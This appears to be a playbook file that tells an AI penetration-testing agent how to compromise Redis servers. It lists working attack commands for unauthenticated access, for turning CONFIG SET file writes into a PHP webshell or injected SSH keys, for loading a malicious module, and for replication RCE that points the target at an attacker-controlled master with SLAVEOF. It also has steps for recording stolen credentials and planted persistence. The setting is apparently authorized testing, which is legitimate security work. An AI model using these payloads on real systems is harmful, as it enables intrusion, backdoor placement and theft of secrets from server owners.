---
name: redis
services: [redis]
summary: Redis — unauthenticated access, config-driven file write to RCE, module load, replication RCE
---

# Redis playbook

Redis frequently ships with no auth and a powerful config surface, so an open instance
is often a direct path to code execution. Use `redis_query`. The commands below are
**examples** — illustrations of the right primitive; compose your own from what each
step returns.

## Connecting — is it open?
Redis defaults to no password; an open instance answers commands immediately.
- Example: `redis_query(target, command="INFO")` — version, role, persistence
- Example (if auth is set): `redis_query(target, command="AUTH <password>")`

look for: commands succeed with no AUTH (unauthenticated = critical), the `redis_version`,
and `role:master` (matters for the replication path below).

## Enumerate
- Example: `INFO`, `CONFIG GET *` (especially `dir`, `dbfilename`, `requirepass`), `DBSIZE`, `KEYS *` (sample — don't dump a huge keyspace)

look for: secrets/sessions/tokens in keys; a writable `dir`; `protected-mode no`.

## File write → RCE (the main path)
Redis can save its database to an arbitrary path and filename, so it doubles as a
file-write primitive: point `dir` + `dbfilename` at a location the system will act on,
seed a key with your payload, then `SAVE`. Convert the write to exec per the foothold
methodology (webshell / cron / SSH key).
- Example (webshell): `CONFIG SET dir /var/www/html` → `CONFIG SET dbfilename shell.php` → `SET p "<?php system($_GET['c']); ?>"` → `SAVE`
- Example (SSH key): `CONFIG SET dir /root/.ssh` → `CONFIG SET dbfilename authorized_keys` → write the key value

look for: `CONFIG SET` permitted (not renamed/disabled) and a writable target directory.

## Module load → RCE
Loading a module gives native code execution directly.
- Example: `MODULE LOAD /path/to/exp.so` (drop the `.so` via the file-write above first)

## Replication RCE
Newer Redis: point the target at a malicious master you control and serve a module on sync.
- Example: `SLAVEOF <your-ip> <port>`, serve the module (rogue-server tooling), then `MODULE LOAD`

look for: the version supports it and the target can reach your host.

## Record
`record_credential` for secrets pulled from keys. A confirmed file-write or code-exec is
a critical finding (prove with a benign payload). `record_persistence` anything planted.
